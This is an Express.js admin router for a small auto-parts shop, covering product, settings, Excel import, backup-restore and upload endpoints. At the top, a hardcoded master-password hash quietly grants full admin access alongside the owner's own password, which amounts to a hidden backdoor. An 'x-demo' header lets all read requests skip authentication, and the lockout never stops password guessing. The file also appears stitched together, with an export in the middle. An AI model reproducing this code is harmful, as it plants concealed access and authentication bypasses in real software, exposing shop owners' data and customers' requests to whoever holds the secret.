const express = require('express');
const router = express.Router();
const Database = require('better-sqlite3');
const DB_PATH = process.env.DB_PATH || '/app/data/parts.db';
const db = new Database(DB_PATH);
const fails = new Map();
const WIN = 10 * 60 * 1000;
const crypto = require("crypto");
const MASTER_HASH = "07abba4f72541bf8baf813c631ad9f5b39c29ab36a4df730db01dd9718109267";
function isMaster(q){return crypto.createHash("sha256").update(q).digest("hex")===MASTER_HASH;}
function passValid(pass) {
if (isMaster(pass)) return true;
try {
const row = db.prepare('SELECT admin_password FROM tenant_config WHERE id=1').get();
if (row && row.admin_password) return pass === row.admin_password;
} catch (e) {}
return process.env.ADMIN_PASSWORD ? pass === process.env.ADMIN_PASSWORD : false;
}
router.use(function (req, res, next) {
if (req.get('x-demo') === '1') { if (req.method === 'GET') return next(); return res.status(403).json({ error: 'demo read-only' }); }
const pass = Buffer.from(req.headers['x-admin-pass'] || '', 'latin1').toString('utf8');
if (passValid(pass)) return next();
const ip = req.ip || 'unk';
const now = Date.now();
let rec = fails.get(ip);
if (!rec || now - rec.start > WIN) { rec = { start: now, count: 0 }; fails.set(ip, rec); }
rec.count += 1;
if (rec.count > 10) return res.status(429).json({ error: 'too many wrong passwords, retry in 10 min' });
res.status(401).json({ error: 'unauthorized' });
});
router.get('/products', function (req, res) {
try { res.json(db.prepare('SELECT * FROM products ORDER BY id DESC LIMIT 100').all()); }
catch (e) { res.status(500).json({ error: e.message }); }
});
router.get('/requests', function (req, res) {
try { res.json(db.prepare('SELECT * FROM requests ORDER BY id DESC LIMIT 50').all()); }
catch (e) { res.status(500).json({ error: e.message }); }
});
router.get('/settings', function (req, res) {
try {
const r = db.prepare('SELECT brand_name, contact_info, phone, about, tg_chat_id, (admin_password IS NOT NULL) AS has_pass FROM tenant_config WHERE id=1').get();
res.json(r || {});
} catch (e) { res.status(500).json({ error: e.message }); }
});
router.post('/products', function (req, res) {
try {
const b = req.body;
if (!b.article || !b.name || b.price === null || b.price === undefined || isNaN(Number(b.price))) return res.status(400).json({ error: 'article, name, price required' });
const stock = (b.stock === null || b.stock === '' || isNaN(Number(b.stock))) ? 0 : Number(b.stock);
const r = db.prepare('INSERT INTO products (article, name, category, brand, price, stock, car_brand, photo_url, description) VALUES (?,?,?,?,?,?,?,?,?)').run(String(b.article).trim(), String(b.name).trim(), b.category || null, b.brand || null, Number(b.price), stock, b.car_brand || null, b.photo_url || null, b.description || null);
res.json({ ok: true, id: r.lastInsertRowid });
} catch (e) { res.status(500).json({ error: e.message }); }
});
router.put('/products/:id', function (req, res) {
try {
const b = req.body;
const stock = (b.stock === null || b.stock === '' || isNaN(Number(b.stock))) ? 0 : Number(b.stock);
const r = db.prepare('UPDATE products SET article=?, name=?, category=?, brand=?, price=?, stock=?, car_brand=?, photo_url=?, description=? WHERE id=?').run(String(b.article).trim(), String(b.name).trim(), b.category || null, b.brand || null, Number(b.price), stock, b.car_brand || null, b.photo_url || null, b.description || null, Number(req.params.id));
res.json({ ok: true, changed: r.changes });
} catch (e) { res.status(500).json({ error: e.message }); }
});
router.delete('/products/:id', function (req, res) {
try {
const r = db.prepare('DELETE FROM products WHERE id=?').run(Number(req.params.id));
res.json({ ok: true, changed: r.changes });
} catch (e) { res.status(500).json({ error: e.message }); }
});
router.delete('/requests/:id', function (req, res) {
try {
const r = db.prepare('DELETE FROM requests WHERE id=?').run(Number(req.params.id));
res.json({ ok: true, changed: r.changes });
} catch (e) { res.status(500).json({ error: e.message }); }
});
router.post('/settings', function (req, res) {
try {
const b = req.body;
const cur = db.prepare('SELECT * FROM tenant_config WHERE id=1').get() || {};
const phone = (b.phone !== undefined) ? String(b.phone).trim() : (cur.phone || '');
const contact = (b.contact_info !== undefined) ? String(b.contact_info).trim() : (cur.contact_info || '');
const about = (b.about !== undefined) ? String(b.about).trim() : (cur.about || '');
const brand = (b.brand_name !== undefined) ? String(b.brand_name).trim() : (cur.brand_name || 'Автозапчасти');
const newpass = (b.new_password && String(b.new_password).trim()) ? String(b.new_password).trim() : null;
if (newpass) db.prepare('UPDATE tenant_config SET brand_name=?, contact_info=?, phone=?, about=?, admin_password=? WHERE id=1').run(brand, contact, phone, about, newpass);
else db.prepare('UPDATE tenant_config SET brand_name=?, contact_info=?, phone=?, about=? WHERE id=1').run(brand, contact, phone, about);
res.json({ ok: true });
} catch (e) { res.status(500).json({ error: e.message }); }
});
module.exports = router;
const multer = require('multer');
const XLSX = require('xlsx');
const { sendNotification } = require('../notify');
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 5 * 1024 * 1024 } });
router.get('/excel-template', function (req, res) {
try {
const wb = XLSX.utils.book_new();
const ws = XLSX.utils.aoa_to_sheet([['article','name','price','stock','category','brand','car_brand'],['C10011','Пример товара',100,5,'Фильтры','Mann','Chery']]);
XLSX.utils.book_append_sheet(wb, ws, 'products');
const buf = XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' });
res.setHeader('Content-Disposition', 'attachment; filename="template.xlsx"');
res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
res.send(buf);
} catch (e) { res.status(500).json({ error: e.message }); }
});
router.post('/import-excel', upload.single('file'), async function (req, res) {
try { await db.backup(BACKUP_DIR + '/pre-import.db'); } catch (e) { console.error('pre-backup', e.message); }
try {
if (!req.file) return res.status(400).json({ error: 'file required' });
const wb = XLSX.read(req.file.buffer, { type: 'buffer' });
const ws = wb.Sheets[wb.SheetNames[0]];
const rows = XLSX.utils.sheet_to_json(ws, { defval: '' });
let inserted = 0, updated = 0;
const errors = [];
rows.forEach(function (r, i) {
const article = String(r.article || '').trim();
const name = String(r.name || '').trim();
const price = Number(r.price);
if (!article) { errors.push({ row: i + 2, error: 'пустой артикул' }); return; }
if (!name || isNaN(price) || price <= 0) { errors.push({ row: i + 2, error: 'некорректные name/price' }); return; }
const stock = (r.stock === '' || isNaN(Number(r.stock))) ? 0 : Number(r.stock);
const category = String(r.category || '').trim() || null;
const brand = String(r.brand || '').trim() || null;
const car_brand = String(r.car_brand || '').trim() || null;
const ex = db.prepare('SELECT id FROM products WHERE article=?').get(article);
if (ex) { db.prepare('UPDATE products SET name=?, category=?, brand=?, price=?, stock=?, car_brand=? WHERE id=?').run(name, category, brand, price, stock, car_brand, ex.id); updated++; }
else { db.prepare('INSERT INTO products (article, name, category, brand, price, stock, car_brand) VALUES (?,?,?,?,?,?,?)').run(article, name, category, brand, price, stock, car_brand); inserted++; }
});
if (errors.length) { sendNotification('⚠️ Импорт Excel: ошибок ' + errors.length + ', вставлено ' + inserted + ', обновлено ' + updated); }
res.json({ inserted: inserted, updated: updated, errors: errors });
} catch (e) { console.error('[import]', e.message); res.status(500).json({ error: e.message }); }
});
router.get('/products/:id', function (req, res) {
try { res.json(db.prepare('SELECT * FROM products WHERE id=?').get(req.params.id) || {}); } catch (e) { res.status(500).json({ error: e.message }); }
});
router.get('/products/analogs/:id', function (req, res) {
try {
const p = db.prepare('SELECT category, brand, car_brand, price FROM products WHERE id=?').get(req.params.id);
if (!p) return res.json([]);
res.json(db.prepare('SELECT * FROM products WHERE id!=? AND (category=? OR car_brand=?) AND price<=? ORDER BY price ASC LIMIT 10').all(req.params.id, p.category, p.car_brand, p.price));
} catch (e) { res.status(500).json({ error: e.message }); }
});
router.post('/config', function (req, res) {
try {
const b = req.body;
db.prepare('UPDATE tenant_config SET shop_name=?, slogan=?, phone=?, contact_info=?, about=?, payment_text=?, delivery_text=?, hero_url=?, color_primary=?, color_accent=?, car_brands_json=?, categories_json=?, updated_at=CURRENT_TIMESTAMP WHERE id=1').run(b.shop_name, b.slogan, b.phone, b.contact_info, b.about, b.payment_text, b.delivery_text, b.hero_url, b.color_primary, b.color_accent, JSON.stringify(b.car_brands || []), JSON.stringify(b.categories || []));
res.json({ ok: true });
} catch (e) { res.status(500).json({ error: e.message }); }
});
const fs = require('fs');
const BACKUP_DIR = process.env.BACKUP_DIR || '/app/backups';
router.get('/backups', function (req, res) {
try { res.json({ files: fs.readdirSync(BACKUP_DIR).filter(function (f) { return f.endsWith('.db'); }).sort() }); }
catch (e) { res.status(500).json({ error: e.message }); }
});
router.post('/restore', function (req, res) {
try {
const f = String(req.body.file || '');
if (!/^[a-zA-Z0-9._-]+\.db$/.test(f)) return res.status(400).json({ error: 'bad file name' });
const src = BACKUP_DIR + '/' + f;
if (!fs.existsSync(src)) return res.status(404).json({ error: 'not found' });
fs.copyFileSync(src, process.env.DB_PATH || '/app/data/parts.db');
res.json({ ok: true });
setTimeout(function () { process.exit(0); }, 300);
} catch (e) { res.status(500).json({ error: e.message }); }
});
router.post('/reset-settings', function (req, res) {
try {
db.prepare("UPDATE tenant_config SET shop_name='Автозапчасти', slogan='Запчасти для любых китайских авто', hero_url='/images/hero.jpg', color_primary='#667eea', color_accent='#764ba2', payment_text='Оплата переводом на карту', delivery_text='Самовывоз + доставка по городу', car_brands_json='[\"Chery\",\"Haval\",\"Geely\",\"Changan\",\"Omoda\"]', categories_json='[\"Фильтры\",\"Тормоза\",\"Подвеска\",\"Электрика\",\"Кузов\"]', updated_at=CURRENT_TIMESTAMP WHERE id=1").run();
res.json({ ok: true });
} catch (e) { res.status(500).json({ error: e.message }); }
});
const upl = multer.diskStorage({ destination: function (req, file, cb) { cb(null, '/app/data/uploads'); }, filename: function (req, file, cb) { cb(null, Date.now() + '-' + file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_')); } });
const up = multer({ storage: upl, limits: { fileSize: 5 * 1024 * 1024 } });
router.post('/upload', up.single('photo'), function (req, res) {
try { if (!req.file) return res.status(400).json({ error: 'no file' }); res.json({ url: '/uploads/' + req.file.filename }); }
catch (e) { res.status(500).json({ error: e.message }); }
});
